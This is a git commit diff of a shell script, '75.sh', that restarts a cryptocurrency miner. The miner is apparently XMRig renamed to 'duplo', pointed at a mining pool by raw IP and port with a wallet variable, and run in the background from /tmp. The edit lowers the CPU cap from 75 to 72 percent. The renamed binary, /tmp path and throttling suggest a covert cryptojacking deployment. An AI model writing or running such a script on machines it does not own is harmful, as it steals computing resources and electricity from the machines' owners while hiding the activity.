fca5bcf5cd982f40b5c08b6b4353949e7df44d4f
rekek <47266646+rekek@users.noreply.github.com>
2019-02-13 12:48:23 -0800

    Update 75.sh

--- 75.sh
+++ 75.sh
@@ -1,4 +1,4 @@
 pkill duplo
 sleep 7
-duplo -o 109.234.35.111:55898 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server8/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=75 --av=1 --variant -1
+duplo -o 109.234.35.111:55898 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server8/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=72 --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/server8/duplo.log'
